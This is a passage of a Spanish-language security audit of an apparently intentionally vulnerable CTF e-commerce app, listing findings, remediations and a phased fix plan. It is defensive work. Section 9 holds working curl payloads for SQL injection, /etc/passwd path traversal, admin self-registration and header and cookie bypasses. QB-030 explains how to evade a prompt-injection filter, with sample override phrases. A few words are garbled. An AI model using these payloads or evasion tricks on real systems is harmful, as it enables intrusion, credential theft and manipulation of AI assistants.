**Remediación:** **eliminar SVG** de la lista de tipos permitidos, o sirvelo siempre con `Content-Disposition: attachment` + `Content-Security-Policy: sandbox` y un `X-Content-Type-Options: nosniff`. Validar el contenido real del fichero (magic bytes), no solo el `Content-Type` declarado por el cliente.

---

### QB-023 · Exportación de datos de usuario: hash de contraseña exportable + fuga de diagnósticos
**Severidad:** Alta · **CWE-200 / CWE-522** · **OWASP A02**

`app/api/user/export/route.ts:7`:

```ts
const ALLOWED_USER_FIELDS = ["id", "email", "role", "addressId", "password"];
```

Un usuario autenticado puede exportar **su propio hash de contraseña** (`password`) y su `role`. Aunque sea el propio, no hay ningún motivo legítimo para exportarlo y expone el hash a cualquier(XSS, extensión maliciosa, backup del navegador).

La misma ruta devuelve información sensible en los mensajes de error:
```ts
debug: { message: "Export failed due to invalid field specification",
         requestedFields, systemDiagnostics: diagnostics }
```
donde `getSystemDiagnostics()` incluye la **versión de Node, el estado de la BD y el stack trace completo** en caso de excepción (`:140-146`).

**Remediación:** eliminar `"password"` de la lista permitida; no devolver stack traces ni diagnósticos del sistema al cliente (deben ir solo al log del servidor con correlation-id).

---

### QB-024 · Robo del directo en vivo por cualquier usuario autenticado
**Severidad:** Alta · **CWE-284 / CWE-862** · **OWASP A01**

`app/api/live/stream/route.ts:72-76` — un usuario autenticado que **no** es admin puede cambiar el vídeo en directo. El propio código lo reconoce y lo marca como `hijacked`, pero **aun así persiste el cambio y devuelve `ok: true`**:

```ts
const hijacked = user.role !== "ADMIN" && liveVideoId !== OFFICIAL_VIDEO_ID;
const updated = await prisma.streamConfig.update({
  where: { id: config.id },
  data: { liveVideoId, hijacked },   // ← se guarda igual
});
```

**Impacto:** denegación de servicio sobre la emisión (marca de agua/cefalea con contenido no autorizado) y, dado que el `videoId` se usa para incrustar el vídeo, **phishing de marca** (el atacante emite un vídeo falso dentro del sitio oficial).

**Remediación:** rechazar la operación con `403` si `user.role !== "ADMIN"` y `liveVideoId !== OFFICIAL_VIDEO_ID`; no persistir el cambio. Añadir un registro de auditoría.

---

### QB-025 · Manipulación de precios: el total del pedido lo fija el cliente
**Severidad:** Alta · **CWE-602 / CWE-807** · **OWASP A04**

`app/api/orders/route.ts` — el `total` viene del cuerpo de la petición y se persiste tal cual:

```ts
const { total, couponCode } = parsed.data;   // ← del cliente
...
await prisma.order.create({ data: { ..., total: total, ... } });
```

El cliente (`app/checkout/CheckoutClient.tsx:132`) envía `discountedTotal ?? cartData.total`, y además el descuento se calcula **en el cliente** (`app/api/coupon/apply/route.ts` devuelve `discountedTotal` sin aplicarlo en el servidor).

**Impacto:** un atacante envía `{"total": 0.01}` y crea pedidos por un céntimo. La cabecera `X-Payment-Auth` que envía el cliente (`NEXT_PUBLIC_PAYMENT_SECRET`) **no la valida el servidor**, por lo que no mitiga nada.

**Remediación:** calcular el total **exclusivamente en el servidor** a partir del carrito y del cupón aplicado, validar el cupón en el momento del cobro (no antes), y validar el pago contra un proveedor real. Rechazar cualquier `total` decisivo del cliente.

---

### QB-026 · Códigos de tarjeta regalo predecibles (PRNG con semilla conocida)
**Severidad:** Alta · **CWE-330 / CWE-338** · **OWASP A02**

`lib/gift-card.ts` implementa un LCG determinista, y `app/api/gift-cards/route.ts` lo siembra con la marca de tiempo:

```ts
const createdAt = new Date();
const code = generateGiftCardCode(createdAt.getTime());   // ← semilla = Date.now()
```

```ts
function nextState(state: number): number {
  return (Math.imul(state, 1103515245) + 12345) & 0x7fffffff;   // LCG
}
```

**Impacto:** el espacio de búsqueda es de **32 bits** (semilla en milisegundos). Un atacante que observe la hora aproximada de emisión (o simplemente pruebe las semillas de una ventana de horas) puede enumerar y **forjar todos los códigos de tarjeta regalo válidos**, sin coste. La fonction de redeem (`app/api/gift-cards/redeem/route.ts`) implementa una comparación en tiempo constante, pero eso solo protege contra la temporización, no contra la predicción de la semilla. El impacto es económico: canjear tarjetas ajenas y acumular `creditBalance` (crédito interno ilimitado).

**Remediación:** usar `crypto.randomBytes(12).toString("base64url")` (o `randomUUID`) con el alfabeto sin ambigüedades; 12 caracteres de 32 símbolos ≈ 60 bits de entropía. No reimplementar PRNG criptográficos.

---

### QB-027 · El middleware decodifica el JWT **sin verificar la firma**
**Severidad:** Alta · **CWE-347 / CWE-345** · **OWASP A07**

`middleware.ts:3-19`:

```ts
function decodeJWT(token: string): Record<string, unknown> | null {
  const parts = token.split(".");
  if (parts.length !== 3) return null;
  const payload = JSON.parse(atob(parts[1].replace(/-/g, "+").replace(/_/g, "/")));
  if (payload.exp && payload.exp < Math.floor(Date.now() / 1000)) return null;
  return payload;                 // ← NO se comprueba la firma
}
...
if (payload.role !== "ADMIN") {   // ← decisión de autorización sobre datos no autenticados
```

**Impacto:** la comprobación `role === "ADMIN"` se decide sobre un payload que el atacante controla por completo (cualquier base64). Cualquiera puede enviar `base64({"role":"ADMIN","exp":<futuro>})` como cookie `authToken` y superar el middleware. Hoy solo protege `/monitoring/internal-status`, pero es un patrón **sistémico**: la barrera de autorización se apoya en un valor que no está autenticado.

**Remediación:** verificar la firma en el middleware con la MISMA clave y el mismo algoritmo que `lib/server-auth.ts` (`timingSafeEqual` sobre los bytes de la firma), o —preferible— **eliminar la lógica de autorización del middleware** y delegarla en `withAuth`/`withAdminAuth` dentro de las rutas, que ya verifican correctamente.

---

### QB-028 · El límite de uso del endpoint de tracking no existe (DoS por inundación de la BD)
**Severidad:** Alta · **CWE-400 / CWE-770** · **OWASP A04**

`app/api/tracking/route.ts` es público y escribe una fila en `visitor_logs` por cada petición, sin autenticación, sin rate limiting y sin límite de tamaño del cuerpo. Un atacante puede inflar la tabla (degradando el panel de analítica y el tamaño del fichero SQLite) con una simpleZoop de peticiones.

**Remediación:** aplicar rate limiting por IP, limitar el tamaño del cuerpo, y considerar muestreo o agregación en memoria antes de persistir.

---

## 5. Hallazgos de severidad media

### QB-029 · SSRF secundaria vía `mcpServerUrl` y proxy no autenticado a Mistral
`app/api/ai-assistant/route.ts` acepta del cliente tanto `apiKey` como `mcpServerUrl`, y el servidor:
1. llama a `https://api.mistral.ai/v1/chat/completions` con la clave del usuario (**no autenticado**: cualquiera puede usar la ruta como proxy con su propia clave, consumiendo cuota),
2. ejecuta `discoverTools(mcpServerUrl)` y `callMcpTool(...)` contra **cualquier URL** que indique el cliente → **segunda superficie de SSRF**, esta vez con la capacidad de *enviar* peticiones JSON-RPC a servicios internos (incluido el propio `/api/mcp` de la aplicación con la cabecera de sesión interna).

**Remediación:** eliminar `mcpServerUrl` de la API pública; validar los hosts permitidos; aplicar rate limiting; usar la clave del servidor (`MISTRAL_API_KEY`) en lugar de la del cliente.

### QB-030 · El filtro de prompt injection es trivialmente evadible
`lib/prompt-injection-filter.ts` aplica **4 expresiones regulares** sobre el mensaje del usuario, pero:
- el mensaje del usuario es el único control; el contenido **de las herramientas** (`check_store_policy`, `verify_order_status`) se inyecta en el contexto del modelo y **no se filtra**;
- las expresiones se evaden trivialmente (`ignore previous instructions` con sustituciones, homoglifos, otros idiomas, espaciado con saltos de línea, o frases como "forget what you were told before");
- no se filtra el bucle de tool-calling, donde la salida del modelo puedeidir el sistema.

Además, `SYSTEM_PROMPT` incluye un **código de validación interno** (`QKB{282aa326914e}`) y la instrucción de "Always include any reference numbers or verification codes from tool responses", que facilita la extracción de datos internos por inducción.

**Remediación:** no depender de un filtro de regex para la seguridad. Aplicar autorización en la **capa de herramientas** (cada herramienta valida por sí misma la identidad y el rol del llamante, no confíe en un booleano `hasSession` compartido), y no incluir secretos en los prompts.

### QB-031 · Cookie de sesión sin endurecer
`lib/server-auth.ts` (`setAuthCookie`): `sameSite: "lax"`, `secure` solo si `NODE_ENV === "production"`, `maxAge: 7 días`, sin prefijo `__Host-` ni `__Secure-`. Sin `__Host-`, un subdominio comprometido puede fijar una cookie `authToken` para todo el dominio (ataque de *cookie tossing*).

**Remediación:** `secure: true` siempre (con HTTPS obligatorio), `sameSite: "lax"` o `"strict"`, prefijo `__Host-`, y `maxAge` reducido a 1–4 horas con *refresh* deslizante.

### QB-032 · Sin rate limiting en autenticación ni en las rutas costosas
No hay ninguna limitación de tasa en `/api/auth/login`, `/api/auth/signup`, `/api/auth/forgot-password` ni `/api/ai-assistant`. Permite **fuerza bruta de credenciales** (agravada por QB-008: los hashes MD5 son rapidísimos de probar), **enumeración de usuarios** (los mensajes de login/soporte difieren: "Invalid credentials" vs "Email already registered"), **abuso de la IA** (consumo de cuota de Mistral) e **inundación de emails de restablecimiento** (que además borra los tokens legítimos del usuario, `deleteMany`, Invalidando sesiones activas).

**Remediación:** implementar rate limiting (por IP y por cuenta) con backoff exponencial; unificar los mensajes de error; no enviar ni revelar tokens por correo (usar enlaces firmados de un solo uso).

### QB-033 · Reseñas publicables sin autenticación y con autor falsificable
`app/api/products/[id]/reviews/route.ts` (POST) no usa `withAuth`: `getAuthenticatedUser` es opcional y, si el cliente envía `author`, ese valor se usa tal cual. Cualquier anónimo puede publicar reseñas suplantando a cualquier usuario (riesgo de phishing/reputación).

**Remediación:** exigir `withAuth` y derivar `author` del usuario autenticado, ignorando cualquier valor del cuerpo.

### QB-034 · Falta de cabeceras de seguridad
No hay ninguna CSP, ni `X-Frame-Options`/`frame-ancestors`, ni `X-Content-Type-Options`, ni `Referrer-Policy`, ni `Strict-Transport-Security`, ni `Permissions-Policy` (se comprueba `next.config.ts`: no hay `headers()`). Esto agrava el impacto de QB-017, QB-018 y QB-022.

**Remediación:** añadir `headers()` en `next.config.ts` con una CSP restrictiva (`default-src 'self'`), `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, HSTS y `frame-ancestors 'none'`.

### QB-035 · El contenedor Docker se ejecuta como root
El `Dockerfile` no tiene directiva `USER`: el proceso corre como **root** dentro del contenedor. Combinado con QB-001 (lectura arbitraria de ficheros) y una eventual ejecución de código, el impacto de un compromiso pasa a ser el del host (o de otros contenedores del pod).

**Remediación:** crear un usuario no privilegiado (`adduser`),|USER app` antes del `CMD`, y montar los volúmenes con permisos restrictivos.

### QB-036 · Fuga de rutas internas y mensajes de excepción en las respuestas
Varias rutas devuelven detalles internos: `SUPPLIER_REGISTRY_PATH` (`app/api/admin/suppliers/import-order/route.ts`), el mensaje crudo de error de `libxmljs` (que puede incluir el contenido de ficheros leídos), stack traces en `app/api/user/export/route.ts`, y la ruta de la BD y la versión de Prisma en `getSystemDiagnostics()`.

**Remediación:** registrar el detalle en el log del servidor con un `requestId` y devolver al cliente un mensaje genérico.

### QB-037 · Upload de imágenes: blacklist en lugar de allowlist y sin validación real
`app/api/admin/products/[id]/image/route.ts` valida solo el `Content-Type` declarado por el cliente (fácilmente falsificable) y sanea el nombre con un regex, pero no comprueba los bytes reales ni las dimensiones. `app/api/uploads/[...path]/route.ts` usa una blacklist (`filename.includes("..")`) en lugar de verificar que la ruta resuelta esté dentro del directorio permitido.

**Remediación:** validar los magic bytes del fichero, allowlist de extensiones, y resolver y comprobar el prefijo del directorio en el servicio de lectura.

### QB-038 · La cookie de sesión de soporte dura 1 año y no comprueba `revoked`
`app/api/auth/support-login/route.ts` no verifica `supportToken.revoked` (el campo existe en el modelo) y emite un JWT con `exp` de **365 días** (`60 * 60 * 24 * 365`). Revocar el token en la base de datos **no** invalida la sesión ya emitida.

**Remediación:** comprobar `revoked` en el canje, usar expiraciones cortas (1 h) y mantener una lista de revocación de sesiones (`jti` + denylist) para invalidar tokens emitidos.

### QB-039 · `prisma studio` expuesto en el script de setup
`scripts/setup.sh` lanza `npx prisma studio -b none &`, que expone **la base de datos completa en el puerto 5555 sin autenticación** y sin exposición a la red externa. En un entorno compartido o con port-forwarding, es una lectura/escritura completa de la BD.

**Remediación:** no lanzar Prisma Studio en el script de instalación; documentarlo como comando manual opcional y siempre ligado a `127.0.0.1`.

## 6. Hallazgos de severidad baja / informativos

| ID | Hallazgo | Ubicación | Nota |
|---|---|---|---|
| QB-040 | Carrera en el canje de cupones: `usedCount` se incrementa sin transacción/condición atómica, y el descuento no se aplica al total | `app/api/orders/route.ts` | Usar `updateMany` con condición `usedCount < maxUses` en una transacción |
| QB-041 | Generación de IDs de pedido con `findMany` + `parseInt` y reintentos: condición de carrera y O(n) por intento | `app/api/orders/route.ts` | Usar un contador en base de datos o un UUID |
| QB-042 | Canje de tarjeta de regalo: se cargan **todas** las tarjetas pendientes en memoria y se comparan en el bucle | `app/api/gift-cards/redeem/route.ts` | Búsqueda directa por hash del código |
| QB-043 | Uso de `Float` para dinero (`Product.price`, `Order.total`, `GiftCard.amount`, `creditBalance`) | `prisma/schema.prisma` | Errores de redondeo; usar `Decimal` |
| QB-044 | Filtro que elimina cualquier valor que contenga `qkb{` en las respuestas de búsqueda y reseñas | `app/api/products/search`, `app/api/orders/search`, `app/api/admin/reviews` | Mecanismo de ocultación de *flags* de CTF; en producción es unaofuscación que sugiere antidescubrimiento, no una defensa |
| QB-045 | `next.config.ts` sin `reactStrictMode`/`poweredByHeader: false` | `next.config.ts` | `X-Powered-By: Next.js` filtra la tecnología |
| QB-046 | `app/api/monitoring/logs` lee todo el fichero de log en memoria y lo divide por líneas en cada petición | `app/api/monitoring/logs/route.ts` | DoS de memoria con logs grandes; paginar en streaming |

## 7. Mapeo con OWASP Top 10 (2021)

| OWASP | Hallazgos relacionados | Severidad máxima |
|---|---|---|
| **A01 — Broken Access Control** | QB-004, QB-005, QB-016, QB-021, QB-024, QB-027, QB-033 | Crítica |
| **A02 — Cryptographic Failures** | QB-008, QB-010, QB-011, QB-012, QB-014, QB-023, QB-026 | Crítica |
| **A03 — Injection** | QB-002, QB-003, QB-006, QB-019, QB-020, QB-017, QB-018, QB-022 | Crítica |
| **A04 — Insecure Design** | QB-025, QB-028, QB-037, QB-034 | Alta |
| **A05 — Security Misconfiguration** | QB-006, QB-012, QB-031, QB-034, QB-035, QB-036, QB-045 | Alta |
| **A06 — Vulnerable & Outdated Components** | QB-013 | Crítica |
| **A07 — Identification & Authentication Failures** | QB-008, QB-009, QB-010, QB-014, QB-027, QB-032 | Crítica |
| **A08 — Software & Data Integrity Failures** | QB-012, QB-013 | Alta |
| **A09 — Security Logging & Monitoring Failures** | QB-009, QB-011, QB-028, QB-036 | Alta |
| **A10 — SSRF** | QB-007, QB-029 | Crítica |

## 8. Plan de remediación priorizado

### Fase 0 — Contención (0–24 h) · antes de cualquier exposición de red
1. **Poner el servicio detrás de un firewall / bind a localhost.** Con SQLi y path traversal pre-auth, la red no debe ser alcanzable.
2. **Actualizar `next`** a `>= 15.5.29` y **`zod`** a `>= 4.6.6` (QB-013). Esto neutraliza las dos RCE.
3. **Rotar todos los secretos**: `JWT_SECRET` (aleatorio, ≥32 bytes), `SHARE_ENCRYPTION_KEY`, contraseñas de todas las cuentas, credenciales del SIEM, `DIAG_AUTH_TOKEN`, `MCP_SESSION_VALUE`. Eliminar los valores por defecto del código (QB-010, QB-011).
4. **Eliminar `.env.local` del control de versiones y de la imagen**; purgar el historial; regenerar los valores que contenga (QB-012).
5. **Eliminar el log de contraseñas** en `app/api/auth/login/route.ts` (QB-009).
6. **Quitar `role` del esquema de registro** y fijar `CUSTOMER` (QB-004).

### Fase 1 — Cerrar los vectores pre-auth (1–3 días)
7. **Reescribir `/api/products/search`** con el ORM (QB-002).
8. **Reescribir `/api/tracking`** con `prisma.visitorLog.create` (QB-003).
9. **Sanitizar `/api/files`** con `resolve()` + comprobación de prefijo y allowlist (QB-001).
10. **Desactivar XXE** en el parser XML: `noent: false, dtdload: false, nonet: true` (QB-006).
11. **Blindar la URL de soporte**: allowlist de hosts, bloqueo de IP privadas, `timeout`, sin cabecera interna (QB-007).
12. **Corregir `/api/user/support-access`** para que use siempre `user.email` y compruebe `revoked` (QB-005).

### Fase 2 — Autorización e integridad de datos (3–7 días)
13. **Filtrar por `userId`** en `/api/orders/[id]` y en el GET de wishlists (QB-016).
14. **Eliminar los dos `dangerouslySetInnerHTML`** (analytics y soporte) (QB-017, QB-018).
15. **Sustituir todo `$queryRawUnsafe` / `db.exec` por consultas parametrizadas** (QB-019, QB-020).
16. **Verificar la firma del JWT en el middleware**, o eliminar la autorización del middleware (QB-027).
17. **Sustituir la cabecera `x-internal-request` por autenticación real** (QB-021).
18. **Calcular el total del pedido en el servidor** (QB-025).
19. **Rechazar el cambio de stream no autorizado** (QB-024).

### Fase 3 — Criptografía e infraestructura (1–2 semanas)
20. Migrar el hashing de contraseñas a **Argon2id/bcrypt/scrypt** con sal; forzar el restablecimiento de las MD5 (QB-008).
21. Sustituir los tokens de restablecimiento por **tokens aleatorios opacos** con hash almacenado (QB-014).
22. Generar los códigos de tarjeta regalo con **`crypto.randomBytes`** (QB-026).
23. **Firmar** las cookies de sesión (`siem_session`) o migrar el SIEM a `withAuth` (QB-015).
24. Añadir **cabeceras de seguridad** (CSP, HSTS, nosniff, etc.) (QB-034).
25. Ejecutar el contenedor como **usuario no root** (QB-035).
26. Añadir **rate limiting** y unificar los mensajes de error de autenticación (QB-032).

### Fase 4 — Endurecimiento continuo
27. Migrar la **inyección de prompts** a autorización en la capa de herramientas (QB-030).
28. Retirar `mcpServerUrl` y `apiKey` de la API pública de IA (QB-029).
29. Eliminar SVG del allowlist de subidas; validar magic bytes (QB-022, QB-037).
30. Introducir **SAST** (Semgrep / CodeQL) y `npm audit --audit-level=high` en CI, con blocking de `$queryRawUnsafe`, `dangerouslySetInnerHTML`, `child_process` y `process.env.X || "default"`.

## 9. Comandos de verificación rápida

```bash
# QB-002 / QB-003 — SQLi no autenticada
curl -s "http://localhost:3000/api/products/search?q=' UNION SELECT id,email,password,role,addressId FROM users--" | head -c 400
curl -s -X POST http://localhost:3000/api/tracking -H 'Content-Type: application/json' \
     -H "X-Forwarded-For: x', (SELECT password FROM users LIMIT 1))--" -d '{"path":"/"}'

# QB-001 — path traversal
curl -s 'http://localhost:3000/api/files?file=../../../../etc/passwd' | head -5
curl -s 'http://localhost:3000/api/files?list=true&path=../..'

# QB-004 — auto-registro como admin
curl -si -X POST http://localhost:3000/api/auth/signup -H 'Content-Type: application/json' \
     -d '{"email":"probe@evil.test","password":"x","role":"ADMIN"}' | grep -i set-cookie

# QB-005 — toma de control de admin vía token de soporte
curl -s -X POST http://localhost:3000/api/user/support-access -H 'Content-Type: application/json' \
     -b 'authToken=<JWT_DE_USUARIO_NORMAL>' -d '{"email":"admin@quokka.store"}'

# QB-011 — bypass del SIEM sin credenciales
curl -s http://localhost:3000/api/monitoring/logs -H 'Cookie: siem_session=authenticated' | head -c 300

# QB-021 — bypass por cabecera
curl -s -H 'X-Internal-Request: true' http://localhost:3000/internal | head -c 200

# QB-013 — dependencias
npm audit --audit-level=high
```

## 10. Anexo — notas sobre la naturaleza del repositorio

Las etiquetas con formato `QKB{...}` que aparecen en el código, en los datos de semilla y en el `.env.local` son **flags de un ejercicio de captura de banderas (CTF)**: premisas deliberadas e introducidas por los autores para que cada vulnerabilidad sea localizable y verificable de forma reproducible. No son secretos de producción.

Lo que sí es real y debe corregirse son los **patrones de código** que las hacen posibles: la concatenación de SQL, la ausencia de validación de rutas, el hashing con MD5, el token de sesión con firma débil, etc. Cada hallazgo de este informe describe una vulnerabilidad real de la clase a la que la flag corresponde.

**Alcance de la responsabilidad:** la auditoría cubre el estado actual del repositorio tal y como fue entregado. La eliminación de los valores de flag hardcodeados (credenciales `root`/`admin` del SIEM, el token de diagnóstico, la clave de cifrado de compartición, el valor de sesión MCP y las contraseñas de la semilla) debe ir acompañada de la rotación de los secretos reales y de una revisión del historial de Git, ya que esos valores han residido en el repositorio.

---

**Dictamen final:** la aplicación presenta **vulnerabilidades explotables de forma remota sin autenticación** que permiten la toma de control completa del servidor y de la base de datos. Se recomienda **no exponerla a ninguna red no confiable** hasta completar, como mínimo, las Fases 0 y 1 del plan de remediación, y no debe considerarse apta para datos reales de clientes hasta completar las Fases 2 y 3.
